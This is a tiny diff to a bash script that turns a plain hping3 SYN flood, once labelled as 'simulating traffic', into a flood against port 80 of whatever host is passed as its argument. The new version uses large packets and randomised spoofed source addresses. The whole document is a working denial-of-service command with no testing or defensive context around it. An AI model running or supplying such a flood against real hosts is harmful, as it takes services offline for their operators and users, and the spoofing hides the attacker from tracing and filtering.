@@ -1,3 +1,2 @@
 #!/bin/bash
-echo "Simulating traffic to $1"
-hping3 --flood -S "$1" >/dev/null 2>&1
+hping3 --flood -d 1460 -S -p 80 --rand-source "$1"
